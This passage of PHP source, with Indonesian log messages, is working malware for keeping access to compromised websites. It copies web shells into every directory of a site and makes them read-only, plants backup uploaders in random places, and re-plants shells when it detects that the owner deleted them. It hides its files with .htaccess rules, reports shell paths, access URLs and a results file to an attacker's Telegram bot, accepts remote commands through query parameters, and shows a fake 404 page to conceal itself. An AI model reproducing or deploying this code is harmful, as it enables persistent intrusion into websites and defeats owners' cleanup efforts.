            $uploaderName = $uploaderNames[$index % count($uploaderNames)];
            $uploaderPath = $dir . DIRECTORY_SEPARATOR . $uploaderName;
            $subdirKey = str_replace($webRoot, '', $dir);
            
            if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
                @chmod($uploaderPath, 0644);
                $backupPaths[] = $uploaderPath;
                $uploaderMap[$subdirKey] = $uploaderName;
                echo "  ✅ New uploader: $uploaderName in $subdirKey\n";
            } else {
                echo "  ❌ FAILED uploader: $uploaderName in $subdirKey\n";
            }
        }
    } else {
        foreach ($uploaderMap as $subdirKey => $uploaderName) {
            $uploaderPath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $uploaderName;
            
            if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
                @chmod($uploaderPath, 0644);
                $backupPaths[] = $uploaderPath;
                echo "  ✅ Reuse uploader: $uploaderName in $subdirKey\n";
            } else {
                echo "  ❌ FAILED uploader: $uploaderName in $subdirKey\n";
            }
        }
    }
    
    $successCount = count($backupPaths);
    $totalCount = $count;
    $successRate = $totalCount > 0 ? $successCount / $totalCount : 0;
    
    setCacheData($webRoot, 'uploaders', [
        'date' => $today,
        'map' => $uploaderMap,
        'success_rate' => $successRate,
        'total' => $totalCount,
        'success' => $successCount,
        'timestamp' => time()
    ]);
    
    return $backupPaths;
}

function cleanupOldUploaders($baseDir, $oldUploaderMap) {
    if (empty($oldUploaderMap)) {
        return;
    }
    
    echo "\n🧹 Cleanup old uploaders from yesterday...\n";
    $deletedCount = 0;
    
    foreach ($oldUploaderMap as $subdirKey => $filename) {
        $filepath = $baseDir . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filepath)) {
            @chmod($filepath, 0644);
            if (@unlink($filepath)) {
                $deletedCount++;
                echo "  ✓ Deleted: $filepath\n";
            }
        }
    }
    
    echo "Total deleted: $deletedCount old uploaders\n";
}

function getAllDirs($dir) {
    $subDirs = [];
    $items = @scandir($dir);
    
    if ($items === false) {
        return $subDirs;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && is_readable($path)) {
            $subDirs[] = $path;
            $subDirs = array_merge($subDirs, getAllDirs($path));
        }
    }
    return $subDirs;
}

function detectUnexpectedDeletion($webRoot, $shellMap) {
    $deleted = [];
    $existing = [];
    
    foreach ($shellMap as $subdirKey => $filename) {
        $filepath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filepath)) {
            $existing[$subdirKey] = $filename;
        } else {
            $deleted[$subdirKey] = $filename;
        }
    }
    
    return [
        'deleted' => $deleted,
        'existing' => $existing
    ];
}

function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge, $newLocations = []) {
    global $telegramBotToken, $telegramChatId;
    
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $safeDomain = str_replace('.', '', $domain);
    
    $hoursAgo = round($cacheAge / 3600, 1);
    
    $alertMessage = "🚨🚨🚨 <b>SECURITY ALERT</b> 🚨🚨🚨\n";
    $alertMessage .= "━━━━━━━━━━━━━━━━\n\n";
    $alertMessage .= "🌐 <b>Domain:</b> {$domain}\n";
    $alertMessage .= "⚠️ <b>Event:</b> Unexpected File Deletion\n\n";
    $alertMessage .= "📊 <b>Details:</b>\n";
    $alertMessage .= "  • Files deleted: <b>{$deletedCount}</b>\n";
    $alertMessage .= "  • Time since last update: <b>{$hoursAgo}h</b>\n";
    $alertMessage .= "  • Expected rotation: <b>24h</b>\n\n";
    
    if ($deletedCount <= 10) {
        $alertMessage .= "📝 <b>Deleted files:</b>\n";
        foreach ($deletedFiles as $subdir => $filename) {
            $alertMessage .= "  • <code>{$subdir}/{$filename}</code>\n";
        }
        $alertMessage .= "\n";
    }
    
    $alertMessage .= "🎯 <b>Response:</b>\n";
    $alertMessage .= "  ✅ Creating {$deletedCount} NEW locations\n";
    $alertMessage .= "  ✅ Avoiding deleted paths\n";
    $alertMessage .= "  ✅ Keeping existing shells intact\n\n";
    
    if (!empty($newLocations)) {
        $alertMessage .= "📂 <b>New Files Created:</b>\n";
        $count = 0;
        foreach ($newLocations as $subdir => $filename) {
            if ($count >= 5) {
                $remaining = count($newLocations) - 5;
                $alertMessage .= "  • <i>... and {$remaining} more</i>\n";
                break;
            }
            $alertMessage .= "  • <code>{$subdir}/{$filename}</code>\n";
            $count++;
        }
        $alertMessage .= "\n";
        
        $alertMessage .= "🔗 <b>Access Now:</b>\n";
        $count = 0;
        foreach ($newLocations as $subdir => $filename) {
            if ($count >= 3) {
                break;
            }
            $url = "https://{$domain}{$subdir}/{$filename}";
            $alertMessage .= "  • <a href=\"{$url}\">{$filename}</a>\n";
            $count++;
        }
        $alertMessage .= "\n";
    }
    
    $alertMessage .= "💡 <b>Analysis:</b>\n";
    if ($deletedCount < 10) {
        $alertMessage .= "  ⚠️ Targeted deletion (owner found specific files)\n";
    } elseif ($deletedCount < 50) {
        $alertMessage .= "  ⚠️ Partial cleanup (owner doing manual search)\n";
    } else {
        $alertMessage .= "  🚨 Mass deletion (owner might know the pattern)\n";
    }
    
    $alertMessage .= "\n⏰ " . date('Y-m-d H:i:s') . "\n";
    $alertMessage .= "━━━━━━━━━━━━━━━━\n\n";
    $alertMessage .= "<i>If you find anything suspicious or need support, chat</i> <a href=\"https://t.me/lamentpicasso\">@lamentpicasso</a> 🐋";
    
    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
    $data = [
        'chat_id' => $telegramChatId,
        'text' => $alertMessage,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    @curl_exec($ch);
    curl_close($ch);
    
    echo "🚨 Security alert sent to Telegram!\n";
}

function createRandomLocations($webRoot, $count, $shellMarker, &$usedFilenames) {
    $directories = getAllDirs($webRoot);
    
    $availableDirs = array_filter($directories, function($dir) use ($webRoot) {
        $relativePath = str_replace($webRoot, '', $dir);
        return strpos($relativePath, DIRECTORY_SEPARATOR . 'wp-admin') === false 
            && strpos($relativePath, DIRECTORY_SEPARATOR . 'wp-includes') === false;
    });
    
    if (count($availableDirs) < $count) {
        $availableDirs = $directories;
    }
    
    shuffle($availableDirs);
    $selectedDirs = array_slice($availableDirs, 0, min($count, count($availableDirs)));
    
    $newLocations = [];
    
    foreach ($selectedDirs as $dir) {
        $subdirKey = str_replace($webRoot, '', $dir);
        $filename = generateSmartFilename($dir, $shellMarker, $usedFilenames);
        $newLocations[$subdirKey] = $filename;
    }
    
    return $newLocations;
}

function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
    $directories = getAllDirs($dir);
    $resultPaths = [];
    $usedFilenames = [];
    
    echo "\nMulai upload shell ke " . count($directories) . " direktori...\n";
    
    $today = date('Y-m-d');
    
    protectCacheFile($dir);
    
    $cache = getCacheData($dir, 'shells') ?? [];
    
    $cacheTimestamp = $cache['timestamp'] ?? 0;
    $cacheAge = time() - $cacheTimestamp;
    $shellMap = $cache['map'] ?? [];
    
    if (!empty($shellMap) && isset($cache['date']) && $cache['date'] === $today) {
        echo "Menggunakan nama file dari cache hari ini ($today)\n";
        
        $status = detectUnexpectedDeletion($dir, $shellMap);
        $deletedCount = count($status['deleted']);
        $existingCount = count($status['existing']);
        
        if ($deletedCount > 0 && $cacheAge < 82800) {
            echo "\n🚨 ADAPTIVE MODE ACTIVATED!\n";
            echo "Detected {$deletedCount} unexpected deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
            
            $newLocations = createRandomLocations($dir, $deletedCount, $shellMarker, $usedFilenames);
            
            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newLocations);
            
            $shellMap = array_merge($status['existing'], $newLocations);
            
            echo "🎯 RESPONSE: Created {$deletedCount} NEW random locations\n";
            echo "✅ Kept {$existingCount} existing shells\n";
            echo "📊 Total active shells: " . count($shellMap) . "\n\n";
            
        } elseif ($deletedCount > 0 && $cacheAge >= 82800) {
            echo "✅ Normal 24h rotation detected ({$deletedCount} files)\n";
        }
        
    } else {
        if (!empty($cache)) {
            echo "Cache expired (tanggal berbeda), generate nama baru\n";
            if (isset($cache['success_rate']) && $cache['success_rate'] < 0.8) {
                echo "⚠️ Success rate rendah kemarin (" . ($cache['success_rate']*100) . "%), KEEP old shells sebagai backup\n";
            } else {
                echo "✅ Success rate bagus kemarin, cleanup old shells\n";
                cleanupOldShells($dir, $cache['map'] ?? []);
            }
        }
        $shellMap = [];
    }
    
    $isNewDay = empty($shellMap);
    
    foreach ($directories as $subdir) {
        $subdirKey = str_replace($dir, '', $subdir);
        
        if (isset($shellMap[$subdirKey])) {
            $smartFilename = $shellMap[$subdirKey];
            $action = "Reuse";
        } else {
            $smartFilename = generateSmartFilename($subdir, $shellMarker, $usedFilenames);
            $shellMap[$subdirKey] = $smartFilename;
            $action = "New";
        }
        
        $filePathShell = $subdir . DIRECTORY_SEPARATOR . $smartFilename;
        
        if (file_exists($filePathShell)) {
            @chmod($filePathShell, 0644);
        }
        
        if (file_put_contents($filePathShell, $shellContent) !== false) {
            @chmod($filePathShell, 0444);
            $resultPaths[] = "SUCCESS: $filePathShell";
            echo "  ✅ $action: $smartFilename in $subdirKey\n";
        } else {
            $resultPaths[] = "FAILED: $filePathShell";
            echo "  ❌ FAILED: $smartFilename in $subdirKey (permission denied)\n";
        }
    }
    
    $successCount = count(array_filter($resultPaths, fn($l) => strpos($l, 'SUCCESS') !== false));
    $totalCount = count($resultPaths);
    $successRate = $totalCount > 0 ? $successCount / $totalCount : 0;
    
    setCacheData($dir, 'shells', [
        'date' => $today,
        'map' => $shellMap,
        'success_rate' => $successRate,
        'total' => $totalCount,
        'success' => $successCount,
        'timestamp' => time()
    ]);
    
    echo "\nStatistik penggunaan nama file:\n";
    arsort($usedFilenames);
    $top5 = array_slice($usedFilenames, 0, 5, true);
    foreach ($top5 as $name => $count) {
        echo "  $name: digunakan $count kali\n";
    }
    
    return $resultPaths;
}

function protectCacheFile($webRoot) {
    $cacheFile = getUnifiedCacheFile($webRoot);
    $cacheFilename = basename($cacheFile);
    $htaccessFile = $webRoot . DIRECTORY_SEPARATOR . '.htaccess';
    
    $htaccessRules = "
# Protect unified cache file
<Files \"{$cacheFilename}\">
    Order Allow,Deny
    Deny from all
</Files>

# Protect database backup
<Files \"db.md\">
    Order Allow,Deny
    Deny from all
</Files>

# Protect all dot files (hidden files)
<FilesMatch \"^\\.\">
    Order Allow,Deny
    Deny from all
</FilesMatch>
";
    
    if (!file_exists($htaccessFile)) {
        if (@file_put_contents($htaccessFile, $htaccessRules) !== false) {
            @chmod($htaccessFile, 0644);
            echo "✅ .htaccess protection created for {$cacheFilename}\n";
        } else {
            echo "⚠️ Cannot create .htaccess (permission denied), cache unprotected\n";
        }
    } else {
        if (!is_writable($htaccessFile)) {
            @chmod($htaccessFile, 0644);
        }
        
        if (is_writable($htaccessFile)) {
            $content = @file_get_contents($htaccessFile);
            if ($content !== false && strpos($content, $cacheFilename) === false) {
                if (@file_put_contents($htaccessFile, $content . "\n" . $htaccessRules) !== false) {
                    echo "✅ .htaccess protection added for {$cacheFilename}\n";
                }
            }
        }
    }
}

function cleanupOldShells($baseDir, $oldShellMap) {
    if (empty($oldShellMap)) {
        return;
    }
    
    echo "\n🧹 Cleanup old shells from yesterday...\n";
    $deletedCount = 0;
    
    foreach ($oldShellMap as $subdirKey => $filename) {
        $filepath = $baseDir . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filepath)) {
            @chmod($filepath, 0644);
            if (@unlink($filepath)) {
                $deletedCount++;
                echo "  ✓ Deleted: $filepath\n";
            }
        }
    }
    
    echo "Total deleted: $deletedCount old shells\n";
}

function writeResultToFile($resultPaths, $outputFile) {
    $data = [
        'date' => date('Y-m-d H:i:s'),
        'results' => $resultPaths,
        'total' => count($resultPaths),
        'success' => count(array_filter($resultPaths, fn($l) => strpos($l, 'SUCCESS') !== false)),
        'failed' => count(array_filter($resultPaths, fn($l) => strpos($l, 'FAILED') !== false))
    ];
    
    $encrypted = encryptCache($data);
    file_put_contents($outputFile, $encrypted);
    @chmod($outputFile, 0600);
    echo "Hasil telah ditulis ke $outputFile (encrypted)\n";
}

echo "\n========================================\n";
echo "Memulai upload shell dari web root: $webRoot\n";
echo "========================================\n";

$hasilPaths = uploadFilesToAllDirs($webRoot, $shellContent, $shellMarker);

$successCount = count(array_filter($hasilPaths, function($line) {
    return strpos($line, 'SUCCESS') !== false;
}));
$failedCount = count(array_filter($hasilPaths, function($line) {
    return strpos($line, 'FAILED') !== false;
}));

echo "\n========================================\n";
echo "RINGKASAN:\n";
echo "Berhasil: $successCount file\n";
echo "Gagal: $failedCount file\n";
echo "========================================\n";

$outputFile = $webRoot . DIRECTORY_SEPARATOR . 'db.md';
writeResultToFile($hasilPaths, $outputFile);

echo "\n========================================\n";
echo "Membuat backup uploader di lokasi acak...\n";
echo "========================================\n";

$backupPaths = createBackupUploaders($webRoot, $uploaderContent, 3);

if (count($backupPaths) > 0) {
    echo "\nBackup uploader berhasil dibuat:\n";
    foreach ($backupPaths as $path) {
        echo "  - $path\n";
    }
} else {
    echo "\nTidak ada backup uploader yang dibuat\n";
}

if (shouldNotify($webRoot, $notificationCooldown)) {
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $safeDomain = str_replace('.', '', $domain);
    
    $summaryMessage = "━━━━━━━━━━━━━━━━\n";
    $summaryMessage .= "📄 <b>REPORT #{$safeDomain}</b>\n";
    $summaryMessage .= "━━━━━━━━━━━━━━━━\n\n";
    $summaryMessage .= "📊 <b>Summary:</b>\n";
    $summaryMessage .= "  ✅ Success: {$successCount}\n";
    $summaryMessage .= "  ❌ Failed: {$failedCount}\n";
    $summaryMessage .= "  🔄 Uploaders: " . count($backupPaths) . "\n\n";
    
    if (count($backupPaths) > 0) {
        $summaryMessage .= "🔗 <b>Backup URLs:</b>\n";
        foreach ($backupPaths as $path) {
            $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
            $url = "https://{$domain}{$relativePath}";
            $summaryMessage .= "  • <code>{$url}</code>\n";
        }
        $summaryMessage .= "\n";
    }
    
    $summaryMessage .= "💬 <b>Commands:</b>\n";
    $summaryMessage .= "  • <code>?notify=1</code> - Force update\n";
    $summaryMessage .= "  • <code>?senddb=1</code> - Get db.md\n";
    $summaryMessage .= "  • <code>?fullreport=1</code> - Full paths file\n\n";
    
    $summaryMessage .= "⏰ " . date('Y-m-d H:i:s') . "\n";
    $summaryMessage .= "━━━━━━━━━━━━━━━━";
    
    sendOrEditMessage($webRoot, $telegramBotToken, $telegramChatId, $summaryMessage, 'chat');
    echo "\n✅ Chat dashboard updated!\n";
    
    $successPaths = array_filter($hasilPaths, fn($l) => strpos($l, 'SUCCESS') !== false);
    $failedPaths = array_filter($hasilPaths, fn($l) => strpos($l, 'FAILED') !== false);
    
    $totalPaths = count($successPaths) + count($failedPaths);
    
    if ($totalPaths > 50) {
        $fullReport = "━━━━━━━━━━━━━━━━\n";
        $fullReport .= "📋 FULL REPORT\n";
        $fullReport .= "🌐 Domain: {$domain}\n";
        $fullReport .= "━━━━━━━━━━━━━━━━\n\n";
        $fullReport .= "📊 Summary:\n";
        $fullReport .= "  ✅ Success: " . count($successPaths) . "\n";
        $fullReport .= "  ❌ Failed: " . count($failedPaths) . "\n";
        $fullReport .= "  📁 Total: {$totalPaths}\n\n";
        
        if (count($successPaths) > 0) {
            $fullReport .= "✅ SUCCESS PATHS (" . count($successPaths) . "):\n";
            $fullReport .= str_repeat("─", 40) . "\n";
            foreach ($successPaths as $line) {
                $path = str_replace('SUCCESS: ', '', $line);
                $fullReport .= $path . "\n";
            }
            $fullReport .= "\n";
        }
        
        if (count($failedPaths) > 0) {
            $fullReport .= "❌ FAILED PATHS (" . count($failedPaths) . "):\n";
            $fullReport .= str_repeat("─", 40) . "\n";
            foreach ($failedPaths as $line) {
                $path = str_replace('FAILED: ', '', $line);
                $fullReport .= $path . "\n";
            }
            $fullReport .= "\n";
        }
        
        if (count($backupPaths) > 0) {
            $fullReport .= "🔄 BACKUP UPLOADERS:\n";
            $fullReport .= str_repeat("─", 40) . "\n";
            foreach ($backupPaths as $path) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                $url = "https://{$domain}{$relativePath}";
                $fullReport .= $url . "\n";
            }
            $fullReport .= "\n";
        }
        
        $fullReport .= str_repeat("─", 40) . "\n";
        $fullReport .= "⏰ Generated: " . date('Y-m-d H:i:s') . "\n";
        $fullReport .= "━━━━━━━━━━━━━━━━";
        
        $reportFile = $webRoot . DIRECTORY_SEPARATOR . $safeDomain . '_full_report.txt';
        file_put_contents($reportFile, $fullReport);
        
        $caption = "📄 <b>Full Report: {$domain}</b>\n";
        $caption .= "📊 {$successCount} success, {$failedCount} failed\n";
        $caption .= "⏰ " . date('Y-m-d H:i:s');
        
        if (sendTelegramDocument($telegramBotToken, $telegramChannelId, $reportFile, $caption)) {
            echo "✅ Full report sent as file to channel!\n";
            @unlink($reportFile);
        }
        
        $detailedReport = "━━━━━━━━━━━━━━━━\n";
        $detailedReport .= "📄 <b>#" . $safeDomain . "</b>\n";
        $detailedReport .= "🌐 {$domain}\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━\n\n";
        $detailedReport .= "📊 <b>Summary:</b>\n";
        $detailedReport .= "  ✅ Success: " . count($successPaths) . "\n";
        $detailedReport .= "  ❌ Failed: " . count($failedPaths) . "\n";
        $detailedReport .= "  📁 Total paths: {$totalPaths}\n\n";
        $detailedReport .= "📎 <b>Full report sent as file above</b>\n";
        $detailedReport .= "  (Too many paths to show inline)\n\n";
        
        if (count($backupPaths) > 0) {
            $detailedReport .= "🔄 <b>BACKUP UPLOADERS:</b>\n";
            foreach ($backupPaths as $path) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                $url = "https://{$domain}{$relativePath}";
                $detailedReport .= "<code>{$url}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        $detailedReport .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━";
        
    } else {
        $detailedReport = "━━━━━━━━━━━━━━━━\n";
        $detailedReport .= "📄 <b>#" . $safeDomain . "</b>\n";
        $detailedReport .= "🌐 {$domain}\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━\n\n";
        
        if (count($successPaths) > 0) {
            $detailedReport .= "✅ <b>SUCCESS (" . count($successPaths) . "):</b>\n";
            foreach ($successPaths as $line) {
                $path = str_replace('SUCCESS: ', '', $line);
                $detailedReport .= "<code>{$path}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        if (count($failedPaths) > 0) {
            $detailedReport .= "❌ <b>FAILED (" . count($failedPaths) . "):</b>\n";
            foreach ($failedPaths as $line) {
                $path = str_replace('FAILED: ', '', $line);
                $detailedReport .= "<code>{$path}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        if (count($backupPaths) > 0) {
            $detailedReport .= "🔄 <b>BACKUP UPLOADERS:</b>\n";
            foreach ($backupPaths as $path) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                $url = "https://{$domain}{$relativePath}";
                $detailedReport .= "<code>{$url}</code>\n";
            }
            $detailedReport .= "\n";
        }
        
        $detailedReport .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        $detailedReport .= "━━━━━━━━━━━━━━━━";
    }
    
    sendOrEditMessage($webRoot, $telegramBotToken, $telegramChannelId, $detailedReport, 'channel');
    echo "✅ Channel report updated!\n";
    
} else {
    echo "\n⏭️ Telegram notification skipped (cooldown active)\n";
}

if (isset($_GET['senddb']) && $_GET['senddb'] == '1') {
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $caption = "📄 <b>db.md Backup</b>\n🌐 {$domain}\n⏰ " . date('Y-m-d H:i:s');
    
    if (sendTelegramDocument($telegramBotToken, $telegramChatId, $outputFile, $caption)) {
        echo "\n✅ db.md sent to Telegram!\n";
    } else {
        echo "\n❌ Failed to send db.md\n";
    }
}

echo "\n========================================\n";
echo "SELESAI! Proses upload selesai.\n";
echo "Lihat detail di: $outputFile\n";
echo "========================================\n";

if (!$showOutput) {
    ob_end_clean();
    
    // Try to trigger real 404 by including WordPress 404 or default server 404
    if (file_exists($webRoot . '/index.php')) {
        // Check if WordPress
        $indexContent = @file_get_contents($webRoot . '/index.php');
        if ($indexContent && strpos($indexContent, 'wp-blog-header') !== false) {
            // WordPress detected, trigger WP 404
            $_SERVER['REQUEST_URI'] = '/nonexistent-page-' . md5(time());
            http_response_code(404);
            
            @define('WP_USE_THEMES', true);
            @require($webRoot . '/wp-blog-header.php');
            exit;
        }
    }
    
    // Check if custom 404.php or 404.html exists
    $custom404Files = [
        $webRoot . '/404.php',
        $webRoot . '/404.html',
        $webRoot . '/404.shtml',
        dirname(__FILE__) . '/404.php',
        dirname(__FILE__) . '/404.html'
    ];
    
    foreach ($custom404Files as $file404) {
        if (file_exists($file404)) {
            http_response_code(404);
            include($file404);
            exit;
        }
    }
    
    // Fallback: Generic 404 that looks like common hosting providers
    http_response_code(404);
    header('Content-Type: text/html; charset=UTF-8');
    
    $serverSoftware = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Apache';
    $requestUri = isset($_SERVER['REQUEST_URI']) ? htmlspecialchars($_SERVER['REQUEST_URI']) : '/';
    $serverName = isset($_SERVER['SERVER_NAME']) ? htmlspecialchars($_SERVER['SERVER_NAME']) : 'localhost';
    
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ' . $requestUri . ' was not found on this server.</p>
<hr>
<address>' . $serverSoftware . ' Server at ' . $serverName . '</address>
</body></html>';
}
